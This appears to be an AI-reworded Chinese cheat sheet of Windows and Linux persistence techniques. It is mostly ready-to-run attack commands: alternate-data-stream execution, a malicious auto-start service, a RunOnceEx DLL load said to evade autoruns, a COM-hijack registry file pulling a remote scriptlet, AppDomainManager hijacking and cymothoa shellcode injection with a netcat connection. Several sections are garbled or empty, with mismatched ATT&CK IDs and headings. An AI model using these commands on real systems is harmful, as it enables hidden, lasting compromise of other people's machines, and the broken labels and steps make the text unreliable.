以下是优化后的文本，使其更加清晰、连贯和专业：

---

### 使用 ADS 数据流进行持久化 (T1137)

#### 示例命令

```bash
echo "empty file" > c:\ADS\file.txt
findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
wmic process call create '"c:\ADS\file.txt:procexp.exe"'
echo "empty file" > c:\ADS\file.txt
type c:\windows\system32\cmd.exe > c:\ADS\file.txt:cmd.exe
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
```

#### TeamViewer 13 示例

```bash
C:\> type \temp\helloworld.hta > "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
C:\> mshta "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
```

#### PHP 示例

未寄宿的 PHP 文件可以执行。

#### 控制示例

链接资料：
- [Putting Data in Alternate Data Streams and How to Execute It](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
- [Twitter Thread](https://twitter.com/bohops/status/954466315913310209)

### 使用 RunOnceEx 进行持久化 (T1137)

#### 步骤

1. **注册 DLL**：发现一种技术来执行 DLL 文件，而不会在登录时被 `autoruns.exe` 检测到。需要管理员权限。
    ```bash
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Users\demon\mbox.dll"
    ```
2. **触发执行**：DLL 将在下次登录时启动。或者运行以下命令立即触发：
    ```bash
    runonce /Explorer
    ```

链接资料：
- [Persistence Using RunOnceEx Hidden from Autoruns.exe](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
- [Description of the RunOnceEx Registry Key](https://support.microsoft.com/en-us/help/310593/description-of-the-runonceex-registry-key)
- [视频教程](https://www.ggsec.cn/RunOnceEx.html)

### 使用 COM 劫持进行持久化 (T1137, T1004)

#### 描述

Microsoft 组件对象模型（COM）是 Windows 内的一个系统，用于通过操作系统实现软件组件之间的交互。攻击者可以使用这个系统插入恶意代码，通过劫持 COM 引用来代替合法的软件来执行持久化。

#### 注册表更改

```reg
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]
@="AtomicRedTeam"
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00\CLSID]
@="{00000001-0000-0000-0000-0000FEEDACDC}"

[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]
@="AtomicRedTeam"
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]
@="{00000001-0000-0000-0000-0000FEEDACDC}"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
@="AtomicRedTeam"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
@="C:\\WINDOWS\\system32\\scrobj.dll"
"ThreadingModel"="Apartment"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
@="AtomicRedTeam.1.00"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
@="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
@="AtomicRedTeam"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{06DA0625-9701-43DA-BFD7-FBEEA2180A1E}\TreatAs]
@="{00000001-0000-0000-0000-0000FEEDACDC}"
```

链接资料：
- [Twitter Thread](https://twitter.com/subTee/status/962767403464577024)
- [MITRE ATT&CK Technique T1122](https://attack.mitre.org/wiki/Technique/T1122)
- [GitHub Gist](https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5)
- [视频教程](https://www.ggsec.cn/winlogon-regedit.html)

### 使用 Image File Execution Options 进行持久化 (T1183)

#### 描述

在恶意代码中，批量程序在启动时会启动 `svchost.exe`。

链接资料：
- [Java Adwind RAT Uses Image File Execution Options](https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-uses-image-file.html?utmcampaign=crowdfire&utmcontent=crowdfire&utmmedium=social&utmsource=twitter%232362224631-tw%231515608604431)
- [视频教程](https://www.ggsec.cn/Image-File-Execution-Options-cmd.html)

### C# 内存加载执行 mimikatz 之 DLL 劫持 (T1038)

#### 代码示例

```csharp
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

public sealed class MyAppDomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        System.Windows.Forms.MessageBox.Show("AppDomain - KaBoom!");
        // You have more control here than I am demonstrating. For example, you can set ApplicationBase,
        // Or you can Override the AssemblyResolver, etc...
        return;
    }
}
```

编译和设置环境变量：

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs
set APPDOMAIN_MANAGER_ASM=tasks,Version=0.0.0.0,Culture=neutral,PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
set COMPLUS_Version=v4.0.30319
copy tasks.dll C:\Windows\System32\Tasks\tasks.dll
copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll
```

链接资料：
- [GitHub Gist](https://gist.github.com/caseysmithrc/4bb34d28fa9d4071596cf2417fee5e37)
- [Twitter Thread](https://twitter.com/subTee/status/1157521629695508480)
- [GitHub Gist](https://gist.github.com/caseysmithrc/3a4db14d571e902dc8c2e00fdbb9907f)
- [GitHub Gist](https://gist.github.com/demonsec666/644c6905cabe405364efe2ceea29e30c)

### Run-key-hexacorn 持久性

#### 步骤

1. 构建
2. 生成
3. 修改
4. 复制
5. 执行

链接资料：
- [Hexacorn's Blog - Part 101](https://hexacorn.com/blog/2014/04/24/running-without-running-part-101/)

### Linux 权限维持

Linux 安全性较高，有完善的安全机制，利用难度较高。以下利用方式都存在缺陷，实际过程中，破解多个高权限账号的密码为最优解。

#### 进程注入示例

使用 `cymothoa` 工具：

```bash
ps -aux  # 查看程序的 PID（Windows 使用 tasklist）
cymothoa -p <目标进程PID> -s <shellcode 编号> -y 3333  # 指定 payload 服务端口
nc -nv 192.168.31.47 4444
```

工具详细介绍：
- [Cymothoa GitHub Repository](https://github.com/jorik041/cymothoa)

---

希望这些改进使文档更加清晰和易于理解。如果有任何进一步的需求或修改，请告诉我！